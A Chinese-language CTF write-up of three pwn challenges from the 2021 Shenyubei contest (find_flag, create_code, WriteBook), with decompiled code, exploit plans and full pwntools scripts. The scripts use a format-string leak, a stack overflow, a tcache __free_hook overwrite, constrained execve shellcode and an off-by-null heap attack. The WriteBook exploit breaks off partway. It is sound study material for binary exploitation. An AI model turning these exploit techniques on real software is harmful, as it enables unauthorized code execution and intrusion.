# 前言
2021深育杯是深信服举办的ctf赛事，此次总结一下pwn和re的部分wp。此次用到的部分exp是借鉴一些pwner和官方给出的exp并对其进行了详细的补充说明，也是自己学习的过程，在此记录一下。
# PWN -> find_flag
## 题目分析
这个题目环境ubuntu20.04，保护全开，程序也是基于栈利用的，存在栈溢出、格式化字符串漏洞，比较简单。
```c
unsigned __int64 sub_132F()
{
  char format[32]; // [rsp+0h] [rbp-60h] BYREF
  char v2[56]; // [rsp+20h] [rbp-40h] BYREF
  unsigned __int64 v3; // [rsp+58h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  printf("Hi! What's your name? ");
  gets(format);
  printf("Nice to meet you, ");
  strcat(format, "!\n");
  printf(format); <-------------fmt>
  printf("Anything else? ");
  gets(v2);  <---------------stack over>
  return __readfsqword(0x28u) ^ v3;
}
```
后门函数：
```c
int sub_1228()
{
  return system("/bin/cat flag.txt");
}
```
## 利用思路
1. 通过格式化字符串泄露出程序基址和canary
2. 通过栈溢出覆盖返回地址为程序后门函数。
## exp
```python
# -*- coding: UTF-8 -*-
from pwn import *

context.log_level = 'debug'
context.terminal = ["/usr/bin/tmux","sp","-h"]

io = remote('192.168.41.180', 2001)
# libc = ELF('./libc-2.31.so')
#io = process('./find_flag')
#libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

l64 = lambda      :u64(p.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
l32 = lambda      :u32(p.recvuntil("\xf7")[-4:].ljust(4,"\x00"))
rl = lambda	a=False		: io.recvline(a)
ru = lambda a,b=True	: io.recvuntil(a,b)
rn = lambda x			: io.recvn(x)
sn = lambda x			: io.send(x)
sl = lambda x			: io.sendline(x)
sa = lambda a,b			: io.sendafter(a,b)
sla = lambda a,b		: io.sendlineafter(a,b)
irt = lambda			: io.interactive()
dbg = lambda text=None  : gdb.attach(io, text)
lg = lambda s			: log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
uu32 = lambda data		: u32(data.ljust(4, '\x00'))
uu64 = lambda data		: u64(data.ljust(8, '\x00'))
ur64 = lambda data		: u64(data.rjust(8, '\x00'))

sl('%17$paaa%19$p')
ru('you, ')

canary = int(rn(16),16)<<8
print hex(canary)
process = int(ru('!')[5:],16) - 0x0146F
print hex(process)
dbg()
pay = 'a'* 0x38 + p64(canary) + p64(0xdeadbeef)+p64(process + 0x01231)
sla('else? ',pay)
irt()

```
## 出题思路
1. 格式化字符串泄露地址
2. 栈溢出控制执行流

# PWN -> create_code
## 题目分析
题目仍然是ubuntu20.04，保护全开，
程序有三个功能:add、del、get，没有edit功能。
```bash
1.add
2.2.get
3.del
4.bye
> 
```
add函数：
```c
ssize_t sub_13F0()
{
  int v1; // [rsp+4h] [rbp-Ch]
  unsigned __int64 buf; // [rsp+8h] [rbp-8h]

  v1 = 0;
  if ( conut > 46 )
    return write(1, "no more data.\n", 0xFuLL);
  ++conut;
  buf = (unsigned __int64)malloc(0x324uLL);
  mprotect((void *)(buf & 0xFFFFFFFFFFFFF000LL), 0x1000uLL, 7);
  write(1, "content: ", 9uLL);
  read(0, (void *)buf, 0x3E8uLL);               // overflow
  qword_4060[conut] = buf;
  if ( *(_DWORD *)buf == 0xF012F012 )
  {
    while ( v1 <= 0x3E7 )
    {
      if ( *(_BYTE *)(buf + v1 + 4) > 0xFu )
        *(_BYTE *)(buf + v1 + 4) = 0;
      ++v1;
    }
    qword_4048 = buf + 4;
    ((void (*)(void))(buf + 4))();               //Restricted backdoor
  }
  else
  {
    *(_DWORD *)buf = 4;
  }
  return write(1, "create successfully.\n", 0x15uLL);
}
```
创建堆块大小固定，如果buf前四个字节不等于0xF012F012则buf前四个字节等于4，存在堆溢出、还有一个代码执行（代码有要求：buf起始必须等于0xF012F012，每个字节必须小于0xf），如果没有接触过很难利用。
del函数：
```c
ssize_t sub_15F0()
{
  ssize_t result; // rax
  int i; // [rsp+8h] [rbp-8h]
  int v2; // [rsp+Ch] [rbp-4h]

  write(1, "id: ", 4uLL);
  result = sub_132A();
  v2 = result;
  if ( (_DWORD)result != -1 )
  {
    if ( (int)result <= conut )
    {
      free((void *)qword_4060[(int)result]);    // uaf
      --conut;
      for ( i = v2; i <= 46; ++i )
        qword_4060[i] = qword_4060[i + 1];
      result = write(1, "delete successfully\n", 0x14uLL);
    }
    else
    {
      result = write(1, "Index out of range.\n", 0x14uLL);
    }
  }
  return result;
}
```
每删除一个chunk，后面的就会往前移动一位。这里也有个uaf。
## 利用思路
有两个利用方式：一个是通过堆溢出，一个是通过限制的后门制造符合规定的指令集合来利用。
**堆溢出方式**
buf头四个字节等于4就对后续使用freehook造成了影响，不能直接申请去写入`/bin/sh`,只能通过堆溢出来对chunk进行覆盖。
1. 通过堆溢出覆盖chunk size为两倍chunk size，当free后chunk的时候会进入unsorted bin，再申请一个chunk，libc的main_area就会进入下一个已经分配的chunk内，从而进行地址泄露；
2. 之后进行tcache attack，修改freehook为system，这里由于buf前四个字节恒为4，不能一次将参数和system地址改掉，所以要通过堆溢出来进行覆盖。先通过溢出写入freehook-0x10地址和`/bin/sh`,然后再修改freehook为system，最后free掉含`/bin/sh`的chunk就能拿shell。
  
**有限制的后门方式**
通过构造每个字节大小都不超过0xf的指令集合来getshell。出题人意在让选手将x64架构下的shellcode改写成符合要求的形式，对汇编改写有较高的要求。
总体思想：就是把一个指令拆分成很多指令执行（符合限制要求的指令），通过al存储要写入的字节值(add al,1、add cl,byte PTR [rdx]对应字节码较小)，cl存储buf的偏移，然后往buf里写字节码，实现shellcode的写入。
详细说一下shellcode指令的构造过程：
看到call buf+4的位置：
```asm
.text:0000000000001500 48 89 05 41 2B 00 00                    mov     cs:qword_4048, rax
.text:0000000000001507 48 8B 15 3A 2B 00 00                    mov     rdx, cs:qword_4048
.text:000000000000150E B8 00 00 00 00                          mov     eax, 0
.text:0000000000001513 FF D2                                   call    rdx ; qword_4048   <-------
.text:0000000000001515 EB 0A                                   jmp     short loc_1521
```
所以可以根据rdx寄存器改写shellcode，rdx指向改写后的shellcode，al用于写入字节值，cl来索引rdx的内容，从而让al字节值写入。构造目标是一段简单的shellcode:
```asm
0x563fc87904a4    push   rdx
0x563fc87904a5    pop    rdi
0x563fc87904a6    add    rdi, 0x30f  <-------args = /bin/sh ,需提前构造
0x563fc87904ad    xor    esi, esi
0x563fc87904af    xor    edx, edx
0x563fc87904b1    push   0x3b
0x563fc87904b3    pop    rax
0x563fc87904b4    syscall  <SYS_execve>
```
转换成字节码为`\x52\x5F\x48\x81\xC7\x0F\x03\x00\x00\x31\xF6\x31\xD2\x6A\x3B\x58\x0F\x05`,发现里面有很多值都超过了0xf的限制，所以这里去除高位保留低位，得到`\x00\x00\x08\x01\x07\x0f\x03\x00\x00\x01\x06\x01\x0e\x08\x0a\x00\x0f\x05`然后高位由符合条件的汇编生成，同样`/bin/sh`也是一样的构造方法。
具体过程和解释可参考exp及其注释内容
**注意**
rip寻址，指向的是当前rip指令地址加上当前指令长度，如：
`add ecx, DWORD PTR [rip+0x20f]`实际赋给ecx的是[rip+0x20f]+6（该指令长度）

## exp
**exp1：堆溢出方式**
```python
from pwn import  *

context(arch='amd64',endian='el',os='linux')
context.terminal = ['/usr/bin/tmux', 'splitw', '-h']
context.log_level = 'debug'
debug = 1
if debug == 1:
  p = process("./create_code")
  libc = ELF("/lib/x86_64-linux-gnu/libc.so.6",checksec=False)
else:
  p = remote("192.168.41.241",2007)
  libc = ELF("./libc.so.6",checksec=False)
#call_libc = cdll.LoadLibrary("/lib/x86_64-linux-gnu/libc.so.6")

sa = lambda s,n : p.sendafter(s,n)
sla = lambda s,n : p.sendlineafter(s,n)
sl = lambda s : p.sendline(s)
sd = lambda s : p.send(s)
rc = lambda n : p.recv(n)
ru = lambda s : p.recvuntil(s)
ti = lambda : p.interactive()
leak = lambda name,addr :log.success(name+":"+hex(addr))
elf = ELF("./create_code",checksec=False)

def cmd(cho):
  sla("> ",str(cho))

def add(content):
  cmd(1)
  sleep(0.02)
  sa("content: ",content)

def show(idx):
  cmd(2)
  sla("id: ",str(idx))

def free(idx):
  cmd(3)
  sla("id: ",str(idx))

def exit():
  cmd(4)
             	#add     1     2  3           4  5  6  7  8    
             	#free 1     2        3  4  5        6                    
add('a\n')   	# 0   -  4  3  3  3  2  1  1  1  1  -  4  4
add('a\n')   	# 1   0  0  -  4  4  3  2  -  3  3  2  2  2*       此处是每次add del的idx索引编号记录
add('a\n')   	# 2   1  1  0  0 *0  0  -  -  -  4- 3  3  3
add('a\n')   	# 3   2  2  1  1  1  -  -  -  -  -  -  -  5
add('a\n')   	# 4   3  3  2  2  2  1  0  0  0  0  0  0  0 
#gdb.attach(p)	# 5              *5  4  3  2  2  2  1  1  1
free(0)
add('a'*0x320 + p64(0) + p64(0x661) ) # overwrite chunk0 size to 0x661 by heap overflow 
free(0)                               # free 0x661 chunk0 , free to unsorted bin
add('aaaaaaaa')                       # add chunk4 to cut unsorted bin ,last_remainder 0x330 chunk,it's fd/bk = main_arena+96
#gdb.attach(p)
show(0)			       # leak libc by main_arena+96 address
p.recvuntil("\x00\x00")
libc.address = u64(p.recvuntil("\x7f")[-6:].ljust(8,'\x00')) -0x1ebbe0
# one = [0xe6c7e,0xe6c81,0xe6c84]
info("libc.address = " + hex(libc.address))
#gdb.attach(p)
add('a\n')                            # malloc chunk5 by unsorted bin 
free(1)                               # tcache attack 
free(0)
free(2)
#gdb.attach(p)                         #(0x330)   tcache_entry[49](3): 0x55d480c8d5d0 --> 0x55d480c8d900 --> 0x55d480c8dc30
add('a'*0x320 + p64(0) + p64(0x331) + p64(libc.sym['__free_hook']-0x10)) # overwrite chunk by heap overflow to modify fd to freehook-0x10
				       # (0x330)   tcache_entry[49](3): 0x55d480c8d900 --> 0x7fc407172b18
add('a\n')                            #(0x330)   tcache_entry[49](3): 0x7fc407172b18
free(1)                               #(0x330)   tcache_entry[49](3): 0x55d480c8d2a0 --> 0x7fc407172b18

add('a'*0x320 + p64(0) + p64(0x331) + "/bin/sh\x00"*4) # overwrite chunk2 fd = '/bin/sh'   tcache_entry[49](3):0x7fc407172b18
add('a'*0x10 + p64(libc.sym['system'])) # modify freehook to system
gdb.attach(p)
free(2)                               # free chunk2

ti()

```
**exp2：有限制的后门方式**
```python
from pwn import*
context(os='linux', arch='amd64')
#context.log_level = 'debug'
context.terminal = ["/usr/bin/tmux","sp","-h"]
BINARY = './create_code'
elf = ELF(BINARY)
if len(sys.argv) > 1and sys.argv[1] == 'r':
    HOST = "127.0.0.1"
    PORT = 8888
    s = remote(HOST, PORT)
else:
    s = process(BINARY)
#context.terminal = ['tmux', 'splitw', '-h']
#s = gdb.debug(BINARY)
#gdb.attach(s)
s.sendline('1')
print(s.recvuntil("content: "))
flag = b"\x12\xF0\x12\xF0"
# make buf offest
# \x01\x05\x00\x06\x00\x00    buf开头  \x01为cl的偏移,后面cl移动就靠add cl,BYTE PTR [rdx],下相当于add cl,1
buf = asm('''
 add DWORD PTR [rip+0x600], eax 
''')
# initial ecx = 0
# make xor ecx,ecx   code 0x31c9
buf += asm('''
 add al, 0x0d
 add al, 0x0d
 add al, 0x0d
 add BYTE PTR [rdx+rax*1], al
 add al, 0x01
 add BYTE PTR [rdx+rax*1], al
 add BYTE PTR [rdx+rax*1], al
 add BYTE PTR [rdx+rax*1], al
 add BYTE PTR [rdx+rax*1], al
 add BYTE PTR [rdx+rax*1], al
''')
# padding 无意义指令 铺垫
buf += asm('''
 add cl,  BYTE PTR [rdx]
 add cl,  BYTE PTR [rdx]
 add cl,  BYTE PTR [rdx+rax*1]
''')
buf += b"\x00"*(0x27-len(buf))  # 长度填充至0x27
# or     al,BYTE PTR [rcx] 目的是为上面初始化ecx预留数据
buf += b"\x0a\x01"  # shellcode运行到这里生成指令 xor ecx,ecx   字节码0x31c9
# rcx = 0x200   rip+0x30f 指向后面构造的数据0x200，至此buf长度为0x2f
buf += asm('''
 add ecx, DWORD PTR [rip+0x30f]
''')
# 真正的shellcode在buf+0x200处
# push rdx   # 0x52
buf += asm('''
 add al, 1
 add byte PTR [rdx+rcx*1], al
 add byte PTR [rdx+rcx*1], al
''')
# pop rdi    # 0x5f
buf += asm('''
 add cl, byte PTR [rdx] 
 add al, 6
 add byte PTR [rdx+rcx*1], al
 add al, 1
 add byte PTR [rdx+rcx*1], al
''')
# al = 0x30
# add rdi, 0x30f  # 4881c70f030000
buf += asm('''
 add cl, byte PTR [rdx]
 add al, 0xf
 add al, 1
 add byte PTR [rdx+rcx*1], al
 add cl, byte PTR [rdx]
 add byte PTR [rdx+rcx*1], al
 add byte PTR [rdx+rcx*1], al
 add cl, byte PTR [rdx]
 add byte PTR [rdx+rcx*1], al
 add byte PTR [rdx+rcx*1], al
 add byte PTR [rdx+rcx*1], al
 add cl, byte PTR [rdx]
 add cl, byte PTR [rdx]
 add cl, byte PTR [rdx]
 add cl, byte PTR [rdx]
''')
# al = 0x40
# xor esi, esi  # 0x31f6
buf += asm('''
 add cl, byte PTR [rdx]
 add al, 0xf
 add al, 0xf
 add al, 0xf
 add al, 0xf
 add al, 0xf
 add al, 0xf
 add al, 0xf
 add al, 0xf
 add al, 0xf
 add al, 0xf
 add al, 0xf
 add al, 0xf
 add al, 0xf
 add al, 0xf
 add al, 0xf
 add al, 0xf
 add byte PTR [rdx+rcx*1], al
 add cl, byte PTR [rdx]
 add byte PTR [rdx+rcx*1], al
 add byte PTR [rdx+rcx*1], al
 add byte PTR [rdx+rcx*1], al
 add byte PTR [rdx+rcx*1], al
 add byte PTR [rdx+rcx*1], al
''')
# al = 0x30
# xor edx, edx  # 0x31d2
buf += asm('''
 add cl, byte PTR [rdx]
 add byte PTR [rdx+rcx*1], al
 add cl, byte PTR [rdx]
 add al, 1
 add byte PTR [rdx+rcx*1], al
 add byte PTR [rdx+rcx*1], al
 add byte PTR [rdx+rcx*1], al
 add byte PTR [rdx+rcx*1], al
''')
# al = 0x31
# push 0x3b  # 0x6a3b
buf += asm('''
 add cl, byte PTR [rdx]
 add byte PTR [rdx+rcx*1], al
 add byte PTR [rdx+rcx*1], al
 add cl, byte PTR [rdx]
 add byte PTR [rdx+rcx*1], al
''')
# al = 0x31
# pop rax  # 0x58
buf += asm('''
 add cl, byte PTR [rdx]
 add al, 0xf
 add al, 0xf
 add al, 0x9
 add byte PTR [rdx+rcx*1], al
''')
# al = 0x58
# make /bin/sh
# rcx = 0x20f     至此buf长度为0xd0  [rip+0x20f] = 0x100
buf += asm('''
 add ecx, DWORD PTR [rip+0x20f]
 add al, 0xf
 add al, 0xf
 add al, 0xf
 add al, 0xf
 add al, 0xf
 add al, 0xf
 add al, 0xf
 add al, 0xf
 add al, 0xf
 add al, 0xf
 add al, 0xf
 add al, 0xf
 add al, 0xf
 add al, 0x5
 add byte PTR [rdx+rcx*1], al
 add cl, byte PTR [rdx]
 add byte PTR [rdx+rcx*1], al
 add byte PTR [rdx+rcx*1], al
 add byte PTR [rdx+rcx*1], al
 add cl, byte PTR [rdx]
 add byte PTR [rdx+rcx*1], al
 add byte PTR [rdx+rcx*1], al
 add byte PTR [rdx+rcx*1], al
 add cl, byte PTR [rdx]
 add byte PTR [rdx+rcx*1], al
 add byte PTR [rdx+rcx*1], al
 add byte PTR [rdx+rcx*1], al
 add cl, byte PTR [rdx]
 add byte PTR [rdx+rcx*1], al
 add cl, byte PTR [rdx]
 add al, 2
 add byte PTR [rdx+rcx*1], al
 add byte PTR [rdx+rcx*1], al
 add byte PTR [rdx+rcx*1], al
 add cl, byte PTR [rdx]
 add byte PTR [rdx+rcx*1], al
 add byte PTR [rdx+rcx*1], al
 add byte PTR [rdx+rcx*1], al
''')
# padding  铺垫 指令长度2
buf += asm('''
 add cl,  BYTE PTR [rdx]
''')*((0x200-len(buf))//2 - 1)
# padding 指令长度3
buf += asm('''
 add cl, byte PTR [rdx+rax*1]
''')
buf += b"\x00\x00\x08\x01\x07\x0f\x03\x00\x00\x01\x06\x01\x0e\x08\x0a\x00\x0f\x05"
buf += b"\x00"*(0x2df-len(buf))
buf += b"\x00\x01"# rcx = 0x30f
buf += b"\x00"*(0x30f-len(buf))
buf += b"\x0f\x02\x09\x0e\x0f\x0d\x02"# /bin/sh
buf += b"\x00"*(0x30f+0x2f-len(buf))
buf += b"\x00\x02"# rcx = 0x200
buf += b"\x00"*(1000-len(buf)) # padding 可去
s.sendline(flag+buf) # 上一步没有padding，此处应变为s.send()
'''
0x563fc87904a4    push   rdx
0x563fc87904a5    pop    rdi
0x563fc87904a6    add    rdi, 0x30f #/bin/sh
0x563fc87904ad    xor    esi, esi
0x563fc87904af    xor    edx, edx
0x563fc87904b1    push   0x3b
0x563fc87904b3    pop    rax
0x563fc87904b4    syscall  <SYS_execve>
'''
s.interactive()

```
## 注意
1. unsortedbin泄露libc方法，切割unsortedbin让mainarea地址落到下一个已分配的chunk内（通常可以配合堆溢出修改size来实现）。
2. 此题freehook利用被限制（*buf = 4），必须通过溢出来进行地址写入。
3. 触发freehook条件：将freehook修改为system后，free的chunk的fd必须是'/bin/sh'。
## 出题思路
1. 堆溢出覆盖chunk size、tcache attack、unsortedbin leak libc；攻击freehook，可以通过限制buf的头几个字节来干扰攻击freehook（如果干扰就要通过溢出来实现freehook的写入）
2. call 一个buf，但buf有字节大小限制，需要构造合适的指令集合。(可以尝试写一个shellcode编码器实现)
## 链接
1. https://github.com/SkyLined/alpha3
2. https://github.com/veritas501/ae64
3. https://defuse.ca/online-x86-assembler.htm#disassembly
# PWN -> WriteBook
## 题目分析
程序仍然是保护全开，编译环境是3ubuntu1~18.04，运行程序：
```bash
======[Write a Book!]======
1. New page
2. Write paper
3. Read paper
4. Destroy the page
5. Repick
> 
```
功能new、write、read、destroy，增改查删功能，通过ida查看主要的漏洞点在write函数
```c
unsigned __int64 __fastcall sub_D6C(__int64 a1, int a2)
{
  unsigned int v2; // eax
  char buf; // [rsp+13h] [rbp-Dh] BYREF
  unsigned int v5; // [rsp+14h] [rbp-Ch]
  unsigned __int64 v6; // [rsp+18h] [rbp-8h]

  v6 = __readfsqword(0x28u);
  v5 = 0;
  if ( a2 )
  {
    while ( v5 != a2 )
    {
      if ( read(0, &buf, 1uLL) != 1 )
      {
        puts("read error");
        exit(-1);
      }
      if ( buf == '\n' )
        break;
      v2 = v5++;
      *(_BYTE *)(v2 + a1) = buf;
    }
    *(_BYTE *)(v5 + a1) = 0;                    // offbynull
  }
  return __readfsqword(0x28u) ^ v6;
```
存在off by null漏洞。
new函数：
```c
unsigned __int64 sub_ABC()
{
  unsigned int v0; // ebx
  unsigned int v1; // ebx
  size_t size; // [rsp+Ch] [rbp-24h] BYREF
  unsigned int i; // [rsp+14h] [rbp-1Ch]
  unsigned __int64 v5; // [rsp+18h] [rbp-18h]

  v5 = __readfsqword(0x28u);
  for ( i = 0; i <= 0x13 && qword_202060[2 * i]; ++i )
    ;
  if ( i == 20 )
  {
    puts("Buy a new book");
  }
  else
  {
    puts("1. Write on one side?");
    puts("2. Write on both sides?");
    while ( 1 )
    {
      while ( 1 )
      {
        printf("> ");
        __isoc99_scanf("%d", (char *)&size + 4);
        if ( HIDWORD(size) == 1 )
          break;
        if ( HIDWORD(size) != 2 )
          return __readfsqword(0x28u) ^ v5;
        printf("size: ");
        __isoc99_scanf("%d", &size);
        if ( (unsigned int)size > 0x10F )
        {
          if ( (unsigned int)size <= 0x1E0 )
          {
            v1 = 2 * i;
            qword_202060[v1] = malloc((unsigned int)size);
            if ( !qword_202060[2 * i] )
              goto LABEL_20;
LABEL_11:
            qword_202060[2 * i + 1] = (unsigned int)size;
            printf("page #%d\n", i);
            return __readfsqword(0x28u) ^ v5;
          }
          puts("can you not write that much?");
        }
        else
        {
          puts("don't waste pages -.-");
        }
      }
      printf("size: ");
      __isoc99_scanf("%d", &size);
      if ( (unsigned int)size <= 0xF0 )
        break;
      puts("too big to fit in a page");
    }
    v0 = 2 * i;
    qword_202060[v0] = malloc((unsigned int)size);
    if ( qword_202060[2 * i] )
      goto LABEL_11;
LABEL_20:
    puts("oh nooooooo! :(");
  }
  return __readfsqword(0x28u) ^ v5;
}
```
程序功能：
1. new malloc申请一个size大小的chunk，one page的大小小于0xf0 ，two page大小为0x10f-0x1e0。申请idx规则是从小到大遍历free掉的chunk数组获取相应idx。
2. write  写入content，存在offbynull
3. read  查看page
4. destroy  删除page
## 利用思路
libc-2.27存在tcache，先绕过tcache然后通过offbynull覆盖下一个chunk的prev_size和size ，释放堆块造成堆块的向前合并(unlink)，再次申请回来，泄露libc，接着申请可以造成chunkoverlap，两个page指向同一个chunk，从而可以free掉一个，通过编辑另一个page写入freehook-8地址，再接着申请出freehook-8堆块将freehook改成system，free触发shell。
1. 申请chunk为填充tcache做准备，offbynull覆盖prev_size和size，构造0x100大小的chunk实现和前面的chunk合并
2. free chunk填充tcache，触发unlink，free chunk进入unsorted bin
3. 将tcache申请回来，申请unsorted bin，read page泄露libc
4. 继续申请chunk造成chunk重叠，修改freehook为system。
5. free触发shell。
  
```
    low     |__chunk0__size=0x101__|  7  
            |__chunk1__size=0x101__|  6   9   10
            |__chunk2__size=0x101__|  5
            |__chunk3__size=0x101__|  4
            |__chunk4__size=0x101__|  3
            |__chunk5__size=0x101__|  2
            |__chunk6__size=0x101__|  1
            |__chunk7__size=0x101__|  0
            |__chunk8__size=0x181__|
    high    |__chunk9__size=0x100(0x181)__| prev_size=0x980
            |__chunk__size=0x81__| 
            |__top_chunk____| 

tcache 7->1
chunk0 -> unsorted bin (delete 0)
向前合并至chunk0 (delete 9)
重新申请回tcache chunk0
show(7) -> leak libc

```

## exp

```python
# coding = utf-8
from pwn import *
context.log_level="debug"
context.terminal = ["/usr/bin/tmux","sp","-h"]
p=process("./writebook")
#elf=ELF("./writebook")
libc=ELF("/home/yrl/glibc-all-in-one/libs/2.27-3ubuntu1.2_amd64/libc.so.6")


def add1(size):
        p.recvuntil("> ")
        p.sendline("1")
        p.recvuntil("2. Write on both sides?\n> ")
        p.sendline("1")
        p.recvuntil("size: ")
        p.sendline(str(size))
def add2(size):
        p.recvuntil("> ")
        p.sendline("1")
        p.recvuntil("2. Write on both sides?\n> ")
        p.sendline("2")
        p.recvuntil("size: ")
        p.sendline(str(size))
def delete(index):
        p.recvuntil("> ")
        p.sendline("4")
        p.recvuntil("Page: ")
        p.sendline(str(index))


def edit(index,content):
        p.recvuntil("> ")
        p.sendline("2")        
        p.recvuntil("Page: ")
        p.sendline(str(index))
        p.recvuntil("Content: ")
        p.sendline(content)


def show(index):
        p.recvuntil("> ")
        p.sendline("3")        
        p.recvuntil("Page: ")
        p.sendline(str(index))


for i in range(8):
    add1(0xf0)
add2(0x178)
add2(0x178)
for i in range(7):
    delete(i+1)


edit(8,b'a'*0x170+p64(0x980)) #off by null
'''
Addr: 0x55cd9156ca50
Size: 0x181


Allocated chunk
Addr: 0x55cd9156cbd0
Size: 0x100


Allocated chunk
Addr: 0x55cd9156ccd0
Size: 0x00


pwndbg> x/10gx 0x55cd9156ca50-0x10
0x55cd9156ca40:        0x0000000000000000        0x0000000000000000
0x55cd9156ca50:        0x0000000000000000        0x0000000000000181  #8
0x55cd9156ca60:        0x6161616161616161        0x6161616161616161
0x55cd9156ca70:        0x6161616161616161        0x6161616161616161
0x55cd9156ca80:        0x6161616161616161        0x6161616161616161
pwndbg> 
0x55cd9156ca90:        0x6161616161616161        0x6161616161616161
0x55cd9156caa0:        0x6161616161616161        0x6161616161616161
0x55cd9156cab0:        0x6161616161616161        0x6161616161616161
0x55cd9156cac0:        0x6161616161616161        0x6161616161616161
0x55cd9156cad0:        0x6161616161616161        0x6161616161616161
pwndbg> 
0x55cd9156cae0:        0x6161616161616161        0x6161616161616161
0x55cd9156caf0:        0x6161616161616161        0x6161616161616161
0x55cd9156cb00:        0x6161616161616161        0x6161616161616161
0x55cd9156cb10:        0x6161616161616161        0x6161616161616161
0x55cd9156cb20:        0x6161616161616161        0x6161616161616161
pwndbg> 
0x55cd9156cb30:        0x6161616161616161        0x6161616161616161
0x55cd9156cb40:        0x6161616161616161        0x6161616161616161
0x55cd9156cb50:        0x6161616161616161        0x6161616161616161
0x55cd9156cb60:        0x6161616161616161        0x6161616161616161
0x55cd9156cb70:        0x6161616161616161        0x6161616161616161
pwndbg> 
0x55cd9156cb80:        0x6161616161616161        0x6161616161616161
0x55cd9156cb90:        0x6161616161616161        0x6161616161616161
0x55cd9156cba0:        0x6161616161616161        0x6161616161616161
0x55cd9156cbb0:        0x6161616161616161        0x6161616161616161
0x55cd9156cbc0:        0x6161616161616161        0x6161616161616161
pwndbg> 
0x55cd9156cbd0:        0x0000000000000980        0x0000000000000100  #181->100
'''
edit(9,b'a'*0xf0+p64(0)+p64(0x81))
'''
Addr: 0x557aed61ca50
Size: 0x181


Allocated chunk
Addr: 0x557aed61cbd0
Size: 0x100


Allocated chunk | PREV_INUSE
Addr: 0x557aed61ccd0
Size: 0x81


Top chunk | PREV_INUSE
Addr: 0x557aed61cd50
Size: 0x202b1


pwndbg> x/10gx 0x557aed61ca40
0x557aed61ca40:        0x0000000000000000        0x0000000000000000
0x557aed61ca50:        0x0000000000000000        0x0000000000000181
0x557aed61ca60:        0x6161616161616161        0x6161616161616161
0x557aed61ca70:        0x6161616161616161        0x6161616161616161
0x557aed61ca80:        0x6161616161616161        0x6161616161616161
pwndbg> 
0x557aed61ca90:        0x6161616161616161        0x6161616161616161
0x557aed61caa0:        0x6161616161616161        0x6161616161616161
0x557aed61cab0:        0x6161616161616161        0x6161616161616161
0x557aed61cac0:        0x6161616161616161        0x6161616161616161
0x557aed61cad0:        0x6161616161616161        0x6161616161616161
pwndbg> 
0x557aed61cae0:        0x6161616161616161        0x6161616161616161
0x557aed61caf0:        0x6161616161616161        0x6161616161616161
0x557aed61cb00:        0x6161616161616161        0x6161616161616161
0x557aed61cb10:        0x6161616161616161        0x6161616161616161
0x557aed61cb20:        0x6161616161616161        0x6161616161616161
pwndbg> 
0x557aed61cb30:        0x6161616161616161        0x6161616161616161
0x557aed61cb40:        0x6161616161616161        0x6161616161616161
0x557aed61cb50:        0x6161616161616161        0x6161616161616161
0x557aed61cb60:        0x6161616161616161        0x6161616161616161
0x557aed61cb70:        0x6161616161616161        0x6161616161616161
pwndbg> 
0x557aed61cb80:        0x6161616161616161        0x6161616161616161
0x557aed61cb90:        0x6161616161616161        0x6161616161616161
0x557aed61cba0:        0x6161616161616161        0x6161616161616161
0x557aed61cbb0:        0x6161616161616161        0x6161616161616161
0x557aed61cbc0:        0x6161616161616161        0x6161616161616161
pwndbg> 
0x557aed61cbd0:        0x0000000000000980        0x0000000000000100
0x557aed61cbe0:        0x6161616161616161        0x6161616161616161
0x557aed61cbf0:        0x6161616161616161        0x6161616161616161
0x557aed61cc00:        0x6161616161616161        0x6161616161616161
0x557aed61cc10:        0x6161616161616161        0x6161616161616161
pwndbg> 
0x557aed61cc20:        0x6161616161616161        0x6161616161616161
0x557aed61cc30:        0x6161616161616161        0x6161616161616161
0x557aed61cc40:        0x6161616161616161        0x6161616161616161
0x557aed61cc50:        0x6161616161616161        0x6161616161616161
0x557aed61cc60:        0x6161616161616161        0x6161616161616161
pwndbg> 
0x557aed61cc70:        0x6161616161616161        0x6161616161616161
0x557aed61cc80:        0x6161616161616161        0x6161616161616161
0x557aed61cc90:        0x6161616161616161        0x6161616161616161
0x557aed61cca0:        0x6161616161616161        0x6161616161616161
0x557aed61ccb0:        0x6161616161616161        0x6161616161616161
pwndbg> 
0x557aed61ccc0:        0x6161616161616161        0x6161616161616161
0x557aed61ccd0:        0x0000000000000000        0x0000000000000081
0x557aed61cce0:        0x0000000000000000        0x0000000000000000
0x557aed61ccf0:        0x0000000000000000        0x0000000000000000
0x557aed61cd00:        0x0000000000000000        0x0000000000000000
pwndbg> 
0x557aed61cd10:        0x0000000000000000        0x0000000000000000
0x557aed61cd20:        0x0000000000000000        0x0000000000000000
0x557aed61cd30:        0x0000000000000000        0x0000000000000000
0x557aed61cd40:        0x0000000000000000        0x0000000000000000
0x557aed61cd50:        0x0000000000000000        0x00000000000202b1
'''
#gdb.attach(p)
delete(0) #unsorted bin
delete(9) #qian xiang he bing
'''
pwndbg> x/10gx 0x5566fdfa8000+0x202060
0x5566fe1aa060:        0x0000000000000000        0x00000000000000f0
0x5566fe1aa070:        0x0000000000000000        0x00000000000000f0
0x5566fe1aa080:        0x0000000000000000        0x00000000000000f0
0x5566fe1aa090:        0x0000000000000000        0x00000000000000f0
0x5566fe1aa0a0:        0x0000000000000000        0x00000000000000f0
pwndbg> 
0x5566fe1aa0b0:        0x0000000000000000        0x00000000000000f0
0x5566fe1aa0c0:        0x0000000000000000        0x00000000000000f0
0x5566fe1aa0d0:        0x0000000000000000        0x00000000000000f0
0x5566fe1aa0e0:        0x00005566feb74a60        0x0000000000000178
0x5566fe1aa0f0:        0x0000000000000000        0x0000000000000178
'''


for i in range(7):
    add1(0xf0)
#gdb.attach(p)
add1(0xf0) #7 new unsorted bin  
show(7)
p.recvuntil("Content: ")
libc_base = u64(p.recv(6).ljust(8,"\x00")) - (0x00007faf52301230-0x7faf51f15000)
free_hook=libc_base+libc.sym['__free_hook']
print "libc_base : "+hex(libc_base)
print "free_hook : "+hex(free_hook)
'''
pwndbg> x/10gx 0x202060+ 0x55c820fd6000
0x55c8211d8060:        0x000055c821adc960        0x00000000000000f0 #0
0x55c8211d8070:        0x000055c821adc860        0x00000000000000f0
0x55c8211d8080:        0x000055c821adc760        0x00000000000000f0
0x55c8211d8090:        0x000055c821adc660        0x00000000000000f0
0x55c8211d80a0:        0x000055c821adc560        0x00000000000000f0
pwndbg> 
0x55c8211d80b0:        0x000055c821adc460        0x00000000000000f0
